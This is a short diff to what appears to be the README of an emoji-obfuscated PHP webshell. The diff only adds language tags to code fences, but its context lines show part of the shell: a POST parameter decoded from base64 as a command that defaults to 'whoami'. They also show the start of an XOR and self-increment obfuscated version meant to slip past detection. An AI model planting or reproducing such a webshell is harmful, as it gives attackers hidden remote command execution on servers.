@@ -3,7 +3,7 @@
 🥸 Nothing new about this webshell, just use same techniques like XOR and self increment operations.
 
 Basically this code
-```
+```php
 <?php
 
 $a = $_POST[4] ? base64_decode($_POST[4]) : 'whoami';
@@ -12,7 +12,7 @@ $a = $_POST[4] ? base64_decode($_POST[4]) : 'whoami';
 ```
 Turn into emoji, self increment and XOR operations.
 
-```
+```php
 <?php
 
 $_=[];
